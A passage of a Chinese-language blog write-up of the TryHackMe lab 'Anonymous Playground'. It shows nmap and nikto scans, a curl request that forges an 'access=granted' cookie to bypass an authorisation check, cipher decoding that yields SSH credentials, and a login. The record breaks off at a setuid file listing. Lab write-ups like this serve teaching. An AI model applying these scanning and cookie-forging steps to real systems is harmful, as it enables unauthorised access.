<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="google-site-verification" content="JleqOUPaJdGpfRPLH4e3NfODV87Fmag6pJBPvxKQKEc"><title>[THM]  Anonymous Playground | Terminal-001 | T3yT3y</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="/js/gitalk.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[THM]  Anonymous Playground</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-07-05T12:54:23.601Z" id="date"> 2023-07-05</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-07-06T03:09:54.295Z" id="updated"> 2023-07-06</time></div></span><br><span>Word Count: <div class="control">5.1k</div></span><br><span>Read Time: <div class="control">27 min</div></span></div></div><hr><div id="post-content"><p class='item-img' data-src='/pic/83410671_p0.png'><img src="/pic/83410671_p0.png" alt="83410671_p0"></p>
<span id="more"></span>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Anonymous Playground是TryHackMe上的一台hard难度的靶机，主要知识点是类仿射密码的解密、栈溢出利用以及tar提权。只要知识面充足这台机子还是很好解决的。</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口、服务等扫描"><a href="#端口、服务等扫描" class="headerlink" title="端口、服务等扫描"></a>端口、服务等扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/THM/Anonymous_Playground/workSpace]<br>└─$ sudo nmap -p- --min-rate=10000 10.10.1.59                          <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-05 10:08 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.1.59<br>Host is up (0.30s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 16.86 seconds<br>                                                              <br>┌──(kali㉿kali)-[~/THM/Anonymous_Playground/workSpace]<br>└─$ sudo nmap -sV -sT -O -p22,80 10.10.1.59  <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-05 10:09 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.1.59<br>Host is up (0.26s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%), Linux 3.2 - 4.9 (92%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Network Distance: 2 hops<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 17.28 seconds<br></code></pre></td></tr></table></figure>

<p>开了22和80端口，虽然不多但是够用。</p>
<h3 id="漏扫"><a href="#漏扫" class="headerlink" title="漏扫"></a>漏扫</h3><h4 id="nmap脚本扫描"><a href="#nmap脚本扫描" class="headerlink" title="nmap脚本扫描"></a>nmap脚本扫描</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/THM/Anonymous_Playground/workSpace]<br>└─$ sudo nmap --script=vuln 10.10.1.59     <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-05 10:10 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.1.59<br>Host is up (0.27s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE                                                                         <br>22/tcp open  ssh                                                                             <br>80/tcp open  http<br>| http-sql-injection: <br>|   Possible sqli <span class="hljs-keyword">for</span> queries:<br>|     http://10.10.1.59:80/js/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://10.10.1.59:80/js/?C=N%3BO%3DD%27%20OR%20sqlspider<br>|     http://10.10.1.59:80/js/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://10.10.1.59:80/js/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://10.10.1.59:80/js/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://10.10.1.59:80/js/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://10.10.1.59:80/js/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://10.10.1.59:80/js/?C=D%3BO%3DD%27%20OR%20sqlspider<br>|     http://10.10.1.59:80/js/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://10.10.1.59:80/js/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://10.10.1.59:80/js/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://10.10.1.59:80/js/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://10.10.1.59:80/js/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://10.10.1.59:80/js/?C=M%3BO%3DD%27%20OR%20sqlspider<br>|     http://10.10.1.59:80/js/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://10.10.1.59:80/js/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://10.10.1.59:80/js/?C=S%3BO%3DD%27%20OR%20sqlspider<br>|     http://10.10.1.59:80/js/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://10.10.1.59:80/js/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://10.10.1.59:80/js/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://10.10.1.59:80/js/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://10.10.1.59:80/js/?C=N%3BO%3DD%27%20OR%20sqlspider<br>|     http://10.10.1.59:80/js/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://10.10.1.59:80/js/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://10.10.1.59:80/js/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://10.10.1.59:80/js/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://10.10.1.59:80/js/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://10.10.1.59:80/js/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://10.10.1.59:80/js/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://10.10.1.59:80/js/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://10.10.1.59:80/js/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://10.10.1.59:80/js/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://10.10.1.59:80/js/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://10.10.1.59:80/js/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://10.10.1.59:80/js/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|_    http://10.10.1.59:80/js/?C=D%3BO%3DA%27%20OR%20sqlspider<br>| http-enum: <br>|   /robots.txt: Robots file<br>|   /css/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.4.29 (ubuntu)&#x27;</span><br>|   /images/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.4.29 (ubuntu)&#x27;</span><br>|_  /js/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.4.29 (ubuntu)&#x27;</span><br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-csrf: Couldn&#x27;</span>t find any CSRF vulnerabilities.<br>| http-aspnet-debug: <br>|_  status: DEBUG is enabled<br>|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-internal-ip-disclosure: </span><br><span class="hljs-string">|_  Internal IP Leaked: 127.0.1.1</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 52.40 seconds</span><br></code></pre></td></tr></table></figure>

<p>SQL注入是误报，不用看了。robots.txt值得一看。http-aspnet-debug说明ASP.NET的debug模式是开着的，查了一下可能可以用来查看网站服务器敏感文件，然而并没有查到介绍具体利用方式的资料，就先作罢。</p>
<h4 id="nikto"><a href="#nikto" class="headerlink" title="nikto"></a>nikto</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/THM/Anonymous_Playground/workSpace]<br>└─$ sudo nikto -h 10.10.1.59          <br>- Nikto v2.5.0<br>---------------------------------------------------------------------------<br>+ Target IP:          10.10.1.59<br>+ Target Hostname:    10.10.1.59<br>+ Target Port:        80<br>+ Start Time:         2023-07-05 10:12:32 (GMT8)<br>---------------------------------------------------------------------------<br>+ Server: Apache/2.4.29 (Ubuntu)<br>+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options<br>+ /: The X-Content-Type-Options header is not <span class="hljs-built_in">set</span>. This could allow the user agent to render the content of the site <span class="hljs-keyword">in</span> a different fashion to the MIME <span class="hljs-built_in">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/<br>+ /: Cookie access created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies<br>+ No CGI Directories found (use <span class="hljs-string">&#x27;-C all&#x27;</span> to force check all possible <span class="hljs-built_in">dirs</span>)<br>+ /robots.txt: Entry <span class="hljs-string">&#x27;/zYdHuAKjP/&#x27;</span> is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file<br>+ /robots.txt: contains 1 entry <span class="hljs-built_in">which</span> should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt<br>+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL <span class="hljs-keyword">for</span> the 2.x branch.<br>+ /images: IP address found <span class="hljs-keyword">in</span> the <span class="hljs-string">&#x27;location&#x27;</span> header. The IP is <span class="hljs-string">&quot;127.0.1.1&quot;</span>. See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed<br>+ /images: The web server may reveal its internal or real IP <span class="hljs-keyword">in</span> the Location header via a request to with HTTP/1.0. The value is <span class="hljs-string">&quot;127.0.1.1&quot;</span>. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649<br>+ /: Web Server returns a valid response with junk HTTP methods <span class="hljs-built_in">which</span> may cause <span class="hljs-literal">false</span> positives.<br>+ /css/: Directory indexing found.<br>+ /css/: This might be interesting.<br>+ /images/: Directory indexing found.<br>+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/<br>+ 8076 requests: 0 error(s) and 13 item(s) reported on remote host<br>+ End Time:           2023-07-05 10:49:23 (GMT8) (2211 seconds)<br>---------------------------------------------------------------------------<br>+ 1 host(s) tested<br></code></pre></td></tr></table></figure>

<p>nikto也告诉我们，robots.txt文件中不希望我们访问<code>/zYdHuAKjP/</code>这个目录。此地无银三百两，真得看看。</p>
<h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><p>先访问下网址。</p>
<p class='item-img' data-src='/pic/assets/04624a40bf5e5b1ebecf57e7e7488c9a.png'><img src="/pic/assets/04624a40bf5e5b1ebecf57e7e7488c9a.png" alt="04624a40bf5e5b1ebecf57e7e7488c9a"></p>
<p>Homepage经典V字仇杀队面具，然后没啥信息了。点开导航栏的Operatives看看。</p>
<p class='item-img' data-src='/pic/assets/4ae2fb644f0f58411124c4441c73a98a.png'><img src="/pic/assets/4ae2fb644f0f58411124c4441c73a98a.png" alt="4ae2fb644f0f58411124c4441c73a98a"></p>
<p>发现一串id，说不定会有用户名啥的，先记住，cy一下。</p>
<p>点contact没反应。</p>
<p>那就先看看之前robots.txt中不想要我们的目录。</p>
<p class='item-img' data-src='/pic/assets/878f4c87710058e23d62ade69f3b1b40.png'><img src="/pic/assets/878f4c87710058e23d62ade69f3b1b40.png" alt="878f4c87710058e23d62ade69f3b1b40"></p>
<p>发现说我们没被授权访问。我寻思你也妹让我登录啊，那就搞清楚咋回事。直接打开控制台看看request和response是啥情况。</p>
<p class='item-img' data-src='/pic/assets/c76da2e27ce666c8aa66dd3709ea5323.png'><img src="/pic/assets/c76da2e27ce666c8aa66dd3709ea5323.png" alt="c76da2e27ce666c8aa66dd3709ea5323"></p>
<p>发现Cookie里面的access里面的value是denied。那我们直接改成granted试试能不能绕过这个授权检测。直接用curl发比较方便。当然用火狐的话可以直接resend里面改也可以。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/THM/Anonymous_Playground/workSpace]<br>└─$ curl http://10.10.1.59/zYdHuAKjP/ -v -H <span class="hljs-string">&quot;Cookie:access=granted&quot;</span><br>*   Trying 10.10.1.59:80...<br>* Connected to 10.10.1.59 (10.10.1.59) port 80 (<span class="hljs-comment">#0)</span><br>&gt; GET /zYdHuAKjP/ HTTP/1.1<br>&gt; Host: 10.10.1.59<br>&gt; User-Agent: curl/7.88.1<br>&gt; Accept: */*<br>&gt; Cookie:access=granted<br>&gt; <br>&lt; HTTP/1.1 200 OK<br>&lt; Date: Wed, 05 Jul 2023 09:19:51 GMT<br>&lt; Server: Apache/2.4.29 (Ubuntu)<br>&lt; Set-Cookie: access=denied; expires=Fri, 04-Aug-2023 09:19:51 GMT; Max-Age=2592000; path=/<br>&lt; Vary: Accept-Encoding<br>&lt; Content-Length: 1379<br>&lt; Content-Type: text/html; charset=UTF-8<br>&lt; <br><br>&lt;!doctype html&gt;<br><br><br>&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br><br>&lt;<span class="hljs-built_in">head</span>&gt;<br>    &lt;title&gt;Proving Grounds&lt;/title&gt;<br>    &lt;!-- Required meta tags --&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>    &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;</span>&gt;<br><br>    &lt;!-- Bootstrap CSS --&gt;<br>    &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;/css/bootstrap.min.css&quot;</span>&gt;<br>    &lt;!-- Custom CSS --&gt;<br>    &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;/css/main.css&quot;</span>&gt;<br><br>    &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;shortcut icon&quot;</span> href=<span class="hljs-string">&quot;/favicon.png&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;image/x-icon&quot;</span>&gt;<br>&lt;/head&gt;<br><br>&lt;body&gt;<br>    &lt;div class=<span class="hljs-string">&quot;container-fluid&quot;</span>&gt;<br>        &lt;ul class=<span class="hljs-string">&quot;nav justify-content-center mb-3&quot;</span>&gt;<br>            &lt;li class=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;<br>                &lt;a class=<span class="hljs-string">&quot;nav-link active text-white&quot;</span> href=<span class="hljs-string">&quot;/&quot;</span>&gt;Home&lt;/a&gt;<br>            &lt;/li&gt;<br>            &lt;li class=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;<br>                &lt;a class=<span class="hljs-string">&quot;nav-link text-white&quot;</span> href=<span class="hljs-string">&quot;/operatives.php&quot;</span>&gt;Operatives&lt;/a&gt;<br>            &lt;/li&gt;<br>            &lt;li class=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;<br>                &lt;a class=<span class="hljs-string">&quot;nav-link text-white&quot;</span> href=<span class="hljs-string">&quot;#&quot;</span>&gt;Contact&lt;/a&gt;<br>            &lt;/li&gt;<br>        &lt;/ul&gt;<br><br>        &lt;div class=<span class="hljs-string">&#x27;row&#x27;</span>&gt;<br>            &lt;div class=<span class="hljs-string">&#x27;col&#x27;</span>&gt;<br>                &lt;p class=<span class="hljs-string">&#x27;text-center&#x27;</span>&gt;Access granted. &lt;br /&gt;<br>                Well <span class="hljs-keyword">done</span> getting this far.  But can you go further? &lt;br /&gt; &lt;br /&gt;<br>                &lt;span style=<span class="hljs-string">&#x27;font-size: 30px;&#x27;</span>&gt;hEzAdCfHzA::hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN&lt;/span&gt;<br>                &lt;/p&gt;<br>            &lt;/div&gt;<br>        &lt;/div&gt;<br>    &lt;/div&gt;<br>&lt;/body&gt;<br>* Connection <span class="hljs-comment">#0 to host 10.10.1.59 left intact</span><br></code></pre></td></tr></table></figure>

<h3 id="解密密文"><a href="#解密密文" class="headerlink" title="解密密文"></a>解密密文</h3><p>我们可以发现我们已经成功授权访问了，返回了一串不知道是啥的字符串：<code>hEzAdCfHzA::hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN</code>。一眼看过去不像是hash值，也不像什么编码。中间的两个<code>::</code>在我们的<code>/etc/passwd</code>或者shadow中很常见，比较像用户名和密码。那么问题又来了，怎么解密这个密码呢。一开始没啥想法，通神在旁边指出用户名和密码前面一截是一样的，而且后面有一块是<code>zAfH</code>像是前面用户反过来的，加上字符都是一个大写一个小写形成一对，很像两个字符对应一个字符。</p>
<p>如果真的是这样的，那么前面的用户名就是一个5位的字符串，且第2位和第5位是一样的字符。这是时候想起之前我们发现的疑是用户名的那串名单，我们找找里面有没有符合以上条件的。发现还真有，就是<code>magna</code>。</p>
<p>第二个问题又来了，虽然找到一部分明文和对应的密文，但是这两个字母是如何映射到一个字母的还需考虑，也就是说代换表还待我们发现。</p>
<p>一开始很自然的就考虑到了ACSII码值，两个相减，发现不太对。又想到是不是字母表顺序，相减不对，相加其他都对，zA是27，如果解释为mod26就解释得通了。全部对应解出来，发现密码是一串有意义的短语，那很大概率是对了。所以总结起来其实这个映射就是。<br>$$<br>decrypt &#x3D; (x + Y) mod 26<br>$$<br>两字母相加模26，得到的结果代表明文在字母表中的顺序。实际上是个很简单的映射，但是如果想不出来就尬住。</p>
<h3 id="获取立足点"><a href="#获取立足点" class="headerlink" title="获取立足点"></a>获取立足点</h3><p>既然拿到了登录凭证，那我们直接ssh登录。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/THM/Anonymous_Playground/workSpace]<br>└─$ ssh magna@10.10.1.59              <br>The authenticity of host <span class="hljs-string">&#x27;10.10.1.59 (10.10.1.59)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:zKvTLbgKsGoKUlP7w/r2yJkjWulPOJtp0DhBDy/GlFQ.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>10.10.1.59<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">magna@10.10.1.59&#x27;</span>s password: <br>Permission denied, please try again.<br>magna@10.10.1.59<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Permission denied, please try again.</span><br><span class="hljs-string">magna@10.10.1.59&#x27;</span>s password: <br>Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-109-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/advantage<br><br>  System information as of Wed Jul  5 03:21:46 UTC 2023<br><br>  System load:  0.14               Processes:           97<br>  Usage of /:   22.9% of 19.56GB   Users logged <span class="hljs-keyword">in</span>:     0<br>  Memory usage: 35%                IP address <span class="hljs-keyword">for</span> eth0: 10.10.1.59<br>  Swap usage:   0%<br><br><br>3 packages can be updated.<br>0 updates are security updates.<br><br><br>Last login: Fri Jul 10 13:54:20 2020 from 192.168.86.65<br>magna@anonymous-playground:~$ <br></code></pre></td></tr></table></figure>

<p>成功登录，在home目录就能拿到第一个flag。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h3><p>在home目录下，不仅有flag，还有点别的有意思的东西。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">magna@anonymous-playground:~$ <span class="hljs-built_in">ls</span> -la<br>total 64<br>drwxr-xr-x 7 magna  magna  4096 Jul 10  2020 .<br>drwxr-xr-x 5 root   root   4096 Jul  4  2020 ..<br>lrwxrwxrwx 1 root   root      9 Jul  4  2020 .bash_history -&gt; /dev/null<br>-rw-r--r-- 1 magna  magna   220 Jul  4  2020 .bash_logout<br>-rw-r--r-- 1 magna  magna  3771 Jul  4  2020 .bashrc<br>drwx------ 2 magna  magna  4096 Jul  4  2020 .cache<br>drwxr-xr-x 3 magna  magna  4096 Jul  7  2020 .config<br>-r-------- 1 magna  magna    33 Jul  4  2020 flag.txt<br>drwx------ 3 magna  magna  4096 Jul  4  2020 .gnupg<br>-rwsr-xr-x 1 